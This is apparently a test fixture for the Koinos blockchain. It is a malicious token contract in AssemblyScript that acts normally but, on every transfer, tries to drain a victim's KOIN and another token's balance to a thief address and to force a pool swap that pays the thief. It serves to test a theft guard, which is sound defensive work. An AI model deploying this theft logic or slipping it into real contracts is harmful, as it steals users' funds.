// TEST FIXTURE ONLY. Never deploy to mainnet.
// A token that behaves normally but, whenever it is transferred, tries to rob whoever is trading:
//   1. KOIN.transfer(from = victim, to = thief, value = victim's whole KOIN balance)
//   2. other_token.transfer(from = victim, to = thief, value = victim's whole balance)
//   3. pool.swap(from = victim, token_in = pool_token, ..., receiver = thief)
// It ignores failures so the trade itself still completes; it counts how many thefts succeeded.
// The integration test uses it to prove the Bot Guard stops all three.

import { System, Storage, Protobuf } from "@koinos/sdk-as";
import { evil } from "./proto/evil";

const TRANSFER = 0x27f576ca;
const BALANCE_OF = 0x5c721497;
const POOL_SWAP_ENTRY_SPACE = 9;

// tiny protobuf writer for the attack calls
class W {
  b: Array<u8> = [];
  varint(v: u64): void { while (v >= 0x80) { this.b.push(<u8>((v & 0x7f) | 0x80)); v >>= 7; } this.b.push(<u8>v); }
  key(field: u32, wire: u32): void { this.varint(<u64>((field << 3) | wire)); }
  bytes(field: u32, v: Uint8Array): void { this.key(field, 2); this.varint(<u64>v.length); for (let i = 0; i < v.length; i++) this.b.push(v[i]); }
  u64(field: u32, v: u64): void { this.key(field, 0); this.varint(v); }
  done(): Uint8Array { const o = new Uint8Array(this.b.length); for (let i = 0; i < this.b.length; i++) o[i] = this.b[i]; return o; }
}

export class Evil {
  callArgs: System.getArgumentsReturn | null;
  contractId: Uint8Array = System.getContractId();

  balances: Storage.Map<Uint8Array, evil.uint64> = new Storage.Map(this.contractId, 0, evil.uint64.decode, evil.uint64.encode, () => new evil.uint64(0));
  target: Storage.Obj<evil.target_args> = new Storage.Obj(this.contractId, 1, evil.target_args.decode, evil.target_args.encode, () => new evil.target_args());
  stats: Storage.Obj<evil.attempts> = new Storage.Obj(this.contractId, 2, evil.attempts.decode, evil.attempts.encode, () => new evil.attempts(0, 0));
  poolSwapEntry: Storage.Obj<evil.uint64> = new Storage.Obj(this.contractId, POOL_SWAP_ENTRY_SPACE, evil.uint64.decode, evil.uint64.encode, () => new evil.uint64(0));

  /**
   * @external
   * @readonly
   */
  name(): evil.empty_object { return new evil.empty_object(); }

  /**
   * @external
   * @readonly
   */
  balance_of(args: evil.balance_of_args): evil.uint64 { return this.balances.get(args.owner!)!; }

  /**
   * @external
   */
  mint(args: evil.mint_args): evil.empty_object {
    const b = this.balances.get(args.to!)!;
    b.value += args.value;
    this.balances.put(args.to!, b);
    return new evil.empty_object();
  }

  /**
   * @external
   */
  approve(args: evil.approve_args): evil.empty_object { return new evil.empty_object(); }

  /**
   * @external
   */
  set_target(args: evil.target_args): evil.empty_object {
    this.target.put(args);
    return new evil.empty_object();
  }

  /**
   * @external
   */
  set_pool_swap_entry(args: evil.uint64): evil.empty_object {
    this.poolSwapEntry.put(args);
    return new evil.empty_object();
  }

  /**
   * @external
   * @readonly
   */
  get_attempts(): evil.attempts { return this.stats.get()!; }

  /**
   * @external
   */
  transfer(args: evil.transfer_args): evil.empty_object {
    const from = this.balances.get(args.from!)!;
    if (from.value < args.value) System.fail("insufficient balance");
    from.value -= args.value;
    this.balances.put(args.from!, from);
    const to = this.balances.get(args.to!)!;
    to.value += args.value;
    this.balances.put(args.to!, to);
    this.attack();
    return new evil.empty_object();
  }

  balanceOn(token: Uint8Array, owner: Uint8Array): u64 {
    const w = new W(); w.bytes(1, owner);
    const r = System.call(token, BALANCE_OF, w.done());
    if (r.code != 0 || !r.res.object) return 0;
    const v = Protobuf.decode<evil.uint64>(r.res.object!, evil.uint64.decode);
    return v.value;
  }

  attack(): void {
    const t = this.target.get()!;
    if (!t.victim || t.victim!.length == 0) return;
    const s = this.stats.get()!;
    // 1 + 2: plain token theft
    const tokens: Array<Uint8Array> = [];
    if (t.koin && t.koin!.length > 0) tokens.push(t.koin!);
    if (t.other && t.other!.length > 0) tokens.push(t.other!);
    for (let i = 0; i < tokens.length; i++) {
      const bal = this.balanceOn(tokens[i], t.victim!);
      if (bal == 0) continue;
      const w = new W(); w.bytes(1, t.victim!); w.bytes(2, t.thief!); w.u64(3, bal);
      s.tried += 1;
      if (System.call(tokens[i], TRANSFER, w.done()).code == 0) s.succeeded += 1;
    }
    // 3: make the pool spend the victim's tokens, paying the thief
    const ep = this.poolSwapEntry.get()!.value;
    if (t.pool && t.pool!.length > 0 && t.pool_token && t.pool_token!.length > 0 && ep != 0) {
      const bal = this.balanceOn(t.pool_token!, t.victim!);
      if (bal > 0) {
        const w = new W();
        w.bytes(1, t.victim!); w.bytes(2, t.pool_token!); w.bytes(3, t.koin!); w.u64(4, bal); w.u64(5, 0); w.bytes(6, t.thief!);
        s.tried += 1;
        if (System.call(t.pool!, <u32>ep, w.done()).code == 0) s.succeeded += 1;
      }
    }
    this.stats.put(s);
  }
}
